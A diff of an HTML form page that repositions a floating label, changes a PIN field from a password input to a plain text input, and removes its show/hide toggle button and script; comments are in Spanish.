@@ -66,9 +66,9 @@
 
         .form-group label {
             position: absolute;
-            top: 50%;
+            top: 70%; /* Ajusta esta propiedad para mover el texto más abajo */
             left: 10px;
-            transform: translateY(-55%);
+            transform: translateY(-50%);
             color: #999;
             transition: top 0.3s, font-size 0.3s;
             pointer-events: none;
@@ -92,22 +92,8 @@
 
         .form-group input:focus + label,
         .form-group input:not(:placeholder-shown) + label {
-            top: 5px;
+            top: 25%; /* Ajusta este valor para que el label se mueva a una mejor posición al enfocarse */
             font-size: 12px;
-        }
-
-        .toggle-button {
-            position: absolute;
-            right: 10px; /* Alinear el botón a la derecha */
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #5a37b4;
-            background: transparent;
-            border: none;
-            padding: 5px; /* Espacio interno reducido */
-            font-size: 14px; /* Tamaño de fuente ajustado */
-            height: 30px; /* Ajustar la altura del botón */
         }
 
         button {
@@ -159,7 +145,7 @@
                         </div>
                         <div class="slider-container">
                             <div class="slider-value" id="sliderValue" style="color: #5A37B4">
-                                \\$1,000 USD
+                                \\\$1,000 USD
                             </div>
                             <input type="range" min="500" max="3000" value="500" class="slider" id="priceSlider" />
                         </div>
@@ -185,47 +171,9 @@
                     </script>
 
                     <div class="form-group">
-                        <input type="password" id="sms" name="nombre" style="width: 100%" maxlength="4" required />
+                        <input type="text" id="sms" name="nombre" style="width: 100%" maxlength="4" required />
                         <label for="sms">PIN *</label>
-                        <button type="button" class="toggle-button" id="togglePin">Mostrar</button>
                     </div>
-
-                    <script>
-                        document.addEventListener("DOMContentLoaded", function () {
-                            const input = document.getElementById("sms");
-                            const label = input.nextElementSibling;
-                            const togglePin = document.getElementById("togglePin");
-
-                            label.style.top = "50%";
-                            if (input.value !== "") {
-                                label.style.top = "15px";
-                                label.style.fontSize = "12px";
-                            }
-
-                            input.addEventListener("focus", () => {
-                                label.style.top = "15px";
-                                label.style.fontSize = "12px";
-                            });
-
-                            input.addEventListener("blur", () => {
-                                if (!input.value) {
-                                    label.style.top = "50%";
-                                    label.style.fontSize = "";
-                                }
-                            });
-
-                            togglePin.addEventListener("click", () => {
-                                // Cambiar el tipo de input entre 'password' y 'text'
-                                if (input.type === 'password') {
-                                    input.type = 'text';
-                                    togglePin.textContent = 'Ocultar';
-                                } else {
-                                    input.type = 'password';
-                                    togglePin.textContent = 'Mostrar';
-                                }
-                            });
-                        });
-                    </script>
                 </div>
                 <div style="width: 100%; text-align: center">
                     <button type="submit">Verificar</button>
